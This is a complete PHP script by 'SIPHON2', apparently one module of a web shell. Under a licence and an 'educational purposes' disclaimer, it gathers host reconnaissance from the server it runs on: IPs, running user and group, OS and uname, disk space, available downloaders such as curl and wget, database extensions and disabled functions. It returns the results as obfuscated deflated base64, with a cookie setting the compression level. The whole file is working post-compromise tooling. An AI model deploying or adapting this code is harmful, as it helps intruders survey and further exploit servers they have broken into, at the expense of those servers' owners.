<?php
/*
*     Copyright (c) 2023 SIPHON2
*     All rights reserved.
*    
*     This PHP script, including any associated documentation or files,
*     is the intellectual property of SIPHON2 and is protected by
*     international copyright laws and treaties. Unauthorized copying,
*     distribution, or reproduction of this script, or any portion
*     thereof, is strictly prohibited and may result in severe civil
*     and criminal penalties, as well as liability for monetary damages.
*    
*     You may not use, modify, adapt, merge, sublicense, rent, lease,
*     loan, sell, or otherwise exploit this script without prior
*     written permission from SIPHON2.
*    
*     You are granted a non-exclusive, non-transferable, limited license
*     to use this script solely for non-commercial purposes or for
*     evaluation purposes with the intent to purchase a commercial
*     license. Any use of this script for commercial purposes without
*     a valid commercial license is expressly prohibited.
*    
*     This script is provided "as is" without any warranties of any kind,
*     whether express or implied. SIPHON2 shall not be liable for any
*     damages, including but not limited to, direct, indirect, special,
*     incidental, or consequential damages or loss of data, even if
*     advised of the possibility of such damages.
*    
*     For inquiries regarding licensing or to obtain written permission
*     to use this script for any purpose not expressly permitted in this
*     notice, please contact SIPHON2 at siphon4545@gmail.com.
*
*
*
*
*
*
*     ---------------------------------------------------------------------------

*     #######################################
*     ##  READ CAREFULLY BEFORE PROCEED!!! ##
*     #######################################

*     This PHP script is intended solely for educational purposes.
*     It is meant to be used as a learning resource and for understanding
*     specific concepts.
*    
*     WARNING: Use this script responsibly and at your own risk. The author
*     (SIPHON2) of this script shall not be liable for any direct, indirect,
*     special, incidental, or consequential damages arising from the use or
*     misuse of this script. The users of this script are solely responsible
*     for any consequences that may occur while using this script. Think twice
*     about the potential consequences and ensure that you have proper
*     authorization before using any part of this script in any environment.
*    
*     By using this script, you agree to accept all risks and responsibilities
*     associated with its usage. If you do not agree with these terms, do not
*     proceed to use this script.
*    
*     Please be reminded that you, and only you, are solely responsible for your
*     actions. Always adhere to responsible and ethical coding practices, and
*     ensure to obtain proper authorization before running any script in a live
*     or production environment.

*     YOUR ACTIONS CARRY CONSEQUENCES, SO THINK TWICE BEFORE PROCEEDING.
*     
*     ---------------------------------------------------------------------------
*     
*     GET BASIC INFORMATION OF THE HOST SYSTEM
*     
*/



$start = microtime(true);

$arguments = [
    "level" => isset($_COOKIE["level"]) ? (int)$_COOKIE["level"] : 9                        // Level of gzdefalte  compression
];

function GET_SYSTEM_INFORMATION()
{
    global $start, $arguments;
    extract($arguments, EXTR_SKIP);
    $downloaders = [];
    $debug = [];

    $cwd = getcwd() ?: NULL;
    // $server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : NULL;
    // $client_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : NULL;
    // $software =isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : NULL;
    $server_ip = $_SERVER['SERVER_ADDR'] ?: NULL;
    $client_ip = $_SERVER['REMOTE_ADDR'] ?: NULL;
    $software =$_SERVER['SERVER_SOFTWARE'] ?: NULL;


    // $user = posix_getpwuid(posix_getuid())['name'];
    // $group = posix_getgrgid(posix_getegid())['name'];
    if (PHP_OS === 'WIN32' || PHP_OS === 'WINNT')
    {
        $user = getenv('USERNAME');
        $group = NULL;
    }
    else
    {
        $user = posix_getpwuid(posix_getuid())['name'];
        $group = posix_getgrgid(posix_getegid())['name'];
    }
    $php_version = phpversion();
    $os = PHP_OS;
    $total_space = disk_total_space('/');
    $free_space = disk_free_space('/');
    $uname = php_uname();
    $downloaders = stream_get_wrappers();
    $wget = is_executable('/usr/bin/wget');
    $curl = extension_loaded('curl');
    $mysql = extension_loaded('mysql');
    $sqlite3 = extension_loaded('sqlite3');
    $oracle = extension_loaded('coi8');
    $postgresql = extension_loaded('pgsql');
    $disabled = ini_get('disabled_functions');
    // $ini = ini_get_all();
    // $extensions = get_loaded_extensions();
    // $functions = get_defined_functions();

    $response = json_encode([
        'status' => empty($debug),
        'time' => microtime(true)-$start,
        'debug' => $debug,
        'operation' => [
            'action' => __FUNCTION__,
            'arguments' => $arguments
        ],
        'data' => [
            'cwd' => $cwd,
            'ip' => [
                'server' => $server_ip,
                'client' => $client_ip
            ],
            'uname' => $uname,
            'user' => $user,
            'group' => $group,
            'php' => $php_version,
            'os' => $os,
            'software' => $software,
            'disk' => [
                'total' => $total_space,
                'free' => $free_space,
            ],
            'downloaders' => $downloaders,
            'curl' => $curl,
            'wget' => $wget,
            'mysql' => $mysql,
            'sqlit3' => $sqlite3,
            'oracle' => $oracle,
            'postgresql' => $postgresql,
            'disabled' => $disabled,
            // 'extensions' => $extensions,
            // 'ini' => $ini,
            // 'functions' => $functions
        ]
    ], JSON_UNESCAPED_UNICODE);

    echo trim(base64_encode(gzdeflate($response, $level)), '=');
    // echo $response;
}

@GET_SYSTEM_INFORMATION();

?>
